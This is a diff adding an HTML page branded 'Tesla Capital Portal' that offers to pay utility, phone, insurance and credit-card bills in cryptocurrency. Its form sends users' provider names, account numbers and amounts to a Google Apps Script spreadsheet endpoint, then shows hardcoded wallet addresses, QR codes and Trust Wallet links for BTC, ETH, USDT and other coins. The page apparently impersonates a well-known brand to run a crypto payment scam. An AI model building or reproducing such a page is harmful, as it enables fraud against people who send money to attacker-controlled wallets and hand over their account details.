@@ -1,1 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Capital Portal - Bill Payments</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    </style>
+</head>
+<body class="text-white min-h-screen flex flex-col justify-between pb-8">
 
+    <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d]">
+        <a href="dashboard.html" class="text-neutral-400 hover:text-white flex items-center text-sm">
+            ‹ Back to Hub
+        </a>
+        <span class="text-xs font-bold tracking-widest text-[#E82127] uppercase">Bill Settlement Terminal</span>
+        <div class="w-12"></div>
+    </header>
+
+    <main class="max-w-md w-full mx-auto px-4 mt-4 flex-grow space-y-6">
+        
+        <!-- App Custom Warning Banner (Matching image_11.png layout structure) -->
+        <div class="bg-red-950/20 border border-red-900/40 rounded-2xl p-4 flex items-start space-x-3">
+            <span class="text-[#E82127] text-base mt-0.5">📢</span>
+            <p class="text-xs text-neutral-300 leading-normal font-medium">
+                Automated clearing house (ACH) integration active. Select a utility grid tier below to initialize instant payment distribution routing.
+            </p>
+        </div>
+
+        <!-- Interactive Custom Bills Grid (8 Expanded US Categories) -->
+        <div class="grid grid-cols-2 gap-3.5">
+            
+            <!-- Card 1: Electricity -->
+            <div onclick="openBillModal('Electricity Grid Utilities')" class="bg-[#141414] border border-[#222] hover:border-amber-500/40 p-4 rounded-2xl cursor-pointer transition-all active:scale-[0.98] space-y-4">
+                <div class="w-9 h-9 bg-amber-500/10 border border-amber-500/20 rounded-xl flex items-center justify-center text-amber-400 text-base">⚡</div>
+                <div>
+                    <h3 class="text-sm font-bold tracking-tight">Electricity</h3>
+                    <p class="text-[10px] text-neutral-500 mt-0.5">Power & Energy</p>
+                </div>
+            </div>
+
+            <!-- Card 2: Phone Bill -->
+            <div onclick="openBillModal('Mobile Carrier Networks')" class="bg-[#141414] border border-[#222] hover:border-sky-500/40 p-4 rounded-2xl cursor-pointer transition-all active:scale-[0.98] space-y-4">
+                <div class="w-9 h-9 bg-sky-500/10 border border-sky-500/20 rounded-xl flex items-center justify-center text-sky-400 text-base">📱</div>
+                <div>
+                    <h3 class="text-sm font-bold tracking-tight">Phone Bill</h3>
+                    <p class="text-[10px] text-neutral-500 mt-0.5">Verizon, AT&T, T-Mobile</p>
+                </div>
+            </div>
+
+            <!-- Card 3: Home Internet -->
+            <div onclick="openBillModal('High-Speed Broadband Internet')" class="bg-[#141414] border border-[#222] hover:border-indigo-500/40 p-4 rounded-2xl cursor-pointer transition-all active:scale-[0.98] space-y-4">
+                <div class="w-9 h-9 bg-indigo-500/10 border border-indigo-500/20 rounded-xl flex items-center justify-center text-indigo-400 text-base">🌐</div>
+                <div>
+                    <h3 class="text-sm font-bold tracking-tight">Internet</h3>
+                    <p class="text-[10px] text-neutral-500 mt-0.5">Xfinity, Spectrum, Fiber</p>
+                </div>
+            </div>
+
+            <!-- Card 4: Streaming & TV -->
+            <div onclick="openBillModal('Streaming Platforms & Cable')" class="bg-[#141414] border border-[#222] hover:border-red-500/40 p-4 rounded-2xl cursor-pointer transition-all active:scale-[0.98] space-y-4">
+                <div class="w-9 h-9 bg-red-500/10 border border-red-500/20 rounded-xl flex items-center justify-center text-red-400 text-base">🎬</div>
+                <div>
+                    <h3 class="text-sm font-bold tracking-tight">Streaming & TV</h3>
+                    <p class="text-[10px] text-neutral-500 mt-0.5">Netflix, Hulu, Cable</p>
+                </div>
+            </div>
+
+            <!-- Card 5: Water & Trash -->
+            <div onclick="openBillModal('Water & Waste Utilities')" class="bg-[#141414] border border-[#222] hover:border-emerald-500/40 p-4 rounded-2xl cursor-pointer transition-all active:scale-[0.98] space-y-4">
+                <div class="w-9 h-9 bg-emerald-500/10 border border-emerald-500/20 rounded-xl flex items-center justify-center text-emerald-400 text-base">💧</div>
+                <div>
+                    <h3 class="text-sm font-bold tracking-tight">Water & Trash</h3>
+                    <p class="text-[10px] text-neutral-500 mt-0.5">Municipal Services</p>
+                </div>
+            </div>
+
+            <!-- Card 6: Insurance -->
+            <div onclick="openBillModal('Insurance Premiums')" class="bg-[#141414] border border-[#222] hover:border-teal-500/40 p-4 rounded-2xl cursor-pointer transition-all active:scale-[0.98] space-y-4">
+                <div class="w-9 h-9 bg-teal-500/10 border border-teal-500/20 rounded-xl flex items-center justify-center text-teal-400 text-base">🏥</div>
+                <div>
+                    <h3 class="text-sm font-bold tracking-tight">Insurance</h3>
+                    <p class="text-[10px] text-neutral-500 mt-0.5">Auto, Home, Medical</p>
+                </div>
+            </div>
+
+            <!-- Card 7: Credit Card Bills -->
+            <div onclick="openBillModal('Credit Card Paydown Ledger')" class="bg-[#141414] border border-[#222] hover:border-purple-500/40 p-4 rounded-2xl cursor-pointer transition-all active:scale-[0.98] space-y-4">
+                <div class="w-9 h-9 bg-purple-500/10 border border-purple-500/20 rounded-xl flex items-center justify-center text-purple-400 text-base">💳</div>
+                <div>
+                    <h3 class="text-sm font-bold tracking-tight">Credit Card</h3>
+                    <p class="text-[10px] text-neutral-500 mt-0.5">Visa, Amex, Mastercard</p>
+                </div>
+            </div>
+
+            <!-- Card 8: Digital Wallets / Sports -->
+            <div onclick="openBillModal('Digital Lifestyle & Entertainment')" class="bg-[#141414] border border-[#222] hover:border-fuchsia-500/40 p-4 rounded-2xl cursor-pointer transition-all active:scale-[0.98] space-y-4">
+                <div class="w-9 h-9 bg-fuchsia-500/10 border border-fuchsia-500/20 rounded-xl flex items-center justify-center text-fuchsia-400 text-base">🎲</div>
+                <div>
+                    <h3 class="text-sm font-bold tracking-tight">Digital / Sports</h3>
+                    <p class="text-[10px] text-neutral-500 mt-0.5">Gaming & Entertainment</p>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Unified Crypto Payment Output Modal Screen -->
+        <div id="paymentModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4 overflow-y-auto">
+            <div class="bg-[#141414] border border-[#222] rounded-3xl p-5 max-w-sm w-full text-center space-y-4 relative my-auto animate-in fade-in zoom-in-95 duration-150">
+                
+                <!-- Close Button -->
+                <button onclick="closeModal()" class="absolute right-4 top-4 text-neutral-500 hover:text-white text-sm font-bold p-1">✕</button>
+
+                <!-- Dynamic Form Container -->
+                <div id="modalFormContainer">
+                    <h2 id="modalBillTitle" class="text-lg font-bold tracking-tight text-left">Pay Bill</h2>
+                    <p class="text-xs text-neutral-400 text-left mt-0.5 mb-4">Complete your settlement parameters below.</p>
+
+                    <form id="billForm" class="space-y-4 text-left">
+                        <div>
+                            <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-400 mb-1.5">Service Provider Name</label>
+                            <input type="text" id="billProvider" required placeholder="e.g. Duke Energy, T-Mobile" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-2.5 text-white text-sm font-medium focus:outline-none focus:border-[#E82127]">
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-400 mb-1.5">Account / Invoice Number</label>
+                            <input type="text" id="billAccount" required placeholder="Enter service reference ID" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-2.5 text-white text-sm font-mono focus:outline-none focus:border-[#E82127]">
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-400 mb-1.5">Payment Network</label>
+                            <select id="assetSelect" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-2.5 text-white text-sm focus:outline-none focus:border-[#E82127]">
+                                <option value="USDT (TRC20)">USDT (Tron Network - TRC20)</option>
+                                <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
+                                <option value="Ethereum (ETH)">Ethereum (ERC20)</option>
+                                <option value="USDC (ERC20)">USD Coin (Ethereum - ERC20)</option>
+                                <option value="USDT (ERC20)">USDT (Ethereum - ERC20)</option>
+                                <option value="Solana (SOL)">Solana (SOL)</option>
+                                <option value="Litecoin (LTC)">Litecoin (LTC)</option>
+                                <option value="XRP (XRP)">XRP (XRP)</option>
+                                <option value="Tron (TRX)">Tron (TRX)</option>
+                                <option value="Dash (DASH)">Dash (DASH)</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-400 mb-1.5">Statement Amount (USD)</label>
+                            <div class="relative">
+                                <span class="absolute left-4 top-2.5 text-neutral-500 text-sm font-medium">$</span>
+                                <input type="number" id="billAmount" required min="1" placeholder="0.00" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl pl-8 pr-4 py-2.5 text-white text-sm font-semibold focus:outline-none focus:border-[#E82127]">
+                            </div>
+                        </div>
+                        <button type="submit" id="submitBtn" class="w-full bg-[#E82127] hover:bg-[#c61a1f] text-white font-medium py-3 rounded-xl text-sm mt-2 transition-all">
+                            Generate Deposit Protocol
+                        </button>
+                    </form>
+                </div>
+
+                <!-- Live Dynamic Crypto Terminal Address (Revealed on Submit) -->
+                <div id="modalPaymentContainer" class="hidden space-y-4">
+                    <div class="bg-[#241a0d] border border-[#3d2a13] rounded-xl p-3 text-left flex items-start space-x-2">
+                        <span class="text-[#f0a23e] text-xs mt-0.5">⚠️</span>
+                        <p class="text-[11px] text-[#f0a23e] font-medium leading-normal">
+                            Send only <span id="bannerAsset">USDT (TRC20)</span> to this settlement block. Cross-network errors will cancel billing execution.
+                        </p>
+                    </div>
+
+                    <div class="bg-white rounded-xl p-3 inline-block">
+                        <img id="qrCodeImg" src="" alt="Terminal QR" class="w-40 h-40 mx-auto">
+                        <p class="text-[10px] text-neutral-500 font-bold mt-1" id="walletLabel">USDT (TRC20)</p>
+                    </div>
+
+                    <div class="space-y-2 text-left">
+                        <div>
+                            <label class="block text-[9px] font-bold uppercase tracking-wider text-neutral-500 mb-1">Clearing Balance Due</label>
+                            <div id="payAmountDisplay" class="bg-[#1c1c1c] border border-[#282828] rounded-xl px-4 py-2.5 text-xs font-mono font-bold text-white">0.00</div>
+                        </div>
+                        <div>
+                            <label class="block text-[9px] font-bold uppercase tracking-wider text-neutral-500 mb-1">Core Receiver Address</label>
+                            <div class="bg-[#1c1c1c] border border-[#282828] rounded-xl p-2.5 font-mono text-[11px] text-neutral-300 flex justify-between items-center gap-2">
+                                <span id="walletAddress" class="break-all tracking-tight select-all">Fetching...</span>
+                                <button type="button" onclick="copyWalletAddress()" class="bg-neutral-800 p-2 rounded-md shrink-0 border border-neutral-700">
+                                    <svg id="copyIcon" class="w-3.5 h-3.5 text-neutral-300" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
+                                    <span id="copyTxt" class="hidden text-[9px] font-bold text-emerald-400">Copied!</span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="pt-1 space-y-2">
+                        <a id="trustWalletLink" href="#" class="w-full bg-[#0052FF] text-white font-medium py-2.5 rounded-xl block text-xs font-semibold">Pay via Trust Wallet</a>
+                        <button onclick="closeModal()" class="w-full bg-neutral-900 text-neutral-400 text-[11px] py-2 rounded-xl border border-neutral-800">I Have Completed Settlement</button>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </main>
+
+    <script>
+        const API_URL = "https://script.google.com/macros/s/AKfycbx7Gg2ClxC7VdaDReZzI4jV_q8RKBDYPteFN526vQjmsxWSmGDQyy-NLkDXhivOHSh0Yw/exec";
+        const userId = localStorage.getItem("userId");
+
+        let activeCategory = "";
+
+        const wallets = {
+            "Dash (DASH)": { address: "XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j", scheme: "dash:XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j", label: "Dash (DASH)" },
+            "Litecoin (LTC)": { address: "ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j", scheme: "litecoin:ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j", label: "Litecoin (LTC)" },
+            "XRP (XRP)": { address: "rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q", scheme: "xrpl:rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q", label: "XRP (XRP)" },
+            "Tron (TRX)": { address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", scheme: "tron:TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", label: "Tron (TRX)" },
+            "USDC (ERC20)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "USD Coin (ERC20)" },
+            "USDT (ERC20)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "USDT (ERC20)" },
+            "Ethereum (ETH)": { address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", scheme: "ethereum:0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80", label: "Ethereum (ETH)" },
+            "Solana (SOL)": { address: "3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b", scheme: "solana:3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b", label: "Solana (SOL)" },
+            "Bitcoin (BTC)": { address: "bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e", scheme: "bitcoin:bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e", label: "Bitcoin (BTC)" },
+            "USDT (TRC20)": { address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", scheme: "tron:TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6", label: "Tether USDT (TRC20)" }
+        };
+
+        if (!userId) { window.location.href = "index.html"; }
+
+        function openBillModal(categoryName) {
+            activeCategory = categoryName;
+            document.getElementById('modalBillTitle').innerText = `Pay ${categoryName}`;
+            document.getElementById('modalFormContainer').classList.remove('hidden');
+            document.getElementById('modalPaymentContainer').classList.add('hidden');
+            document.getElementById('paymentModal').classList.remove('hidden');
+            document.getElementById('billForm').reset();
+            document.getElementById('submitBtn').disabled = false;
+            document.getElementById('submitBtn').innerText = "Generate Deposit Protocol";
+        }
+
+        function closeModal() {
+            document.getElementById('paymentModal').classList.add('hidden');
+        }
+
+        async function copyWalletAddress() {
+            const addressText = document.getElementById('walletAddress').innerText;
+            const copyIcon = document.getElementById('copyIcon');
+            const copyTxt = document.getElementById('copyTxt');
+            try {
+                await navigator.clipboard.writeText(addressText);
+                copyIcon.classList.add('hidden'); copyTxt.classList.remove('hidden');
+                setTimeout(() => { copyTxt.classList.add('hidden'); copyIcon.classList.remove('hidden'); }, 2000);
+            } catch (err) { /* Fallback */ }
+        }
+
+        document.getElementById('billForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Transmitting statements...";
+
+            const provider = document.getElementById('billProvider').value;
+            const account = document.getElementById('billAccount').value;
+            const asset = document.getElementById('assetSelect').value;
+            const amount = parseFloat(document.getElementById('billAmount').value);
+            const selectedWallet = wallets[asset];
+
+            // Sends directly to your spreadsheet tabs
+            const payload = {
+                action: "submitInvestment", 
+                userId: userId,
+                amount: amount,
+                asset: `Bill Pay: ${activeCategory} (${provider} - Acct: ${account}) via ${asset}`
+            };
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: "POST",
+                    mode: "cors",
+                    headers: { "Content-Type": "text/plain" },
+                    body: JSON.stringify(payload)
+                });
+                const result = await response.json();
+
+                if (result.status === "success") {
+                    document.getElementById('walletAddress').innerText = selectedWallet.address;
+                    document.getElementById('payAmountDisplay').innerText = `$${amount.toFixed(2)} USD (${asset.split(' ')[0]})`;
+                    document.getElementById('bannerAsset').innerText = selectedWallet.label;
+                    document.getElementById('walletLabel').innerText = selectedWallet.label;
+                    document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(selectedWallet.address)}`;
+                    document.getElementById('trustWalletLink').href = `${selectedWallet.scheme}?amount=${amount}`;
+
+                    document.getElementById('modalFormContainer').classList.add('hidden');
+                    document.getElementById('modalPaymentContainer').classList.remove('hidden');
+                } else { throw new Error(result.message); }
+            } catch (err) {
+                alert(err.message || "Failed to process statement linking query.");
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Generate Deposit Protocol";
+            }
+        });
+    </script>
+</body>
+</html>
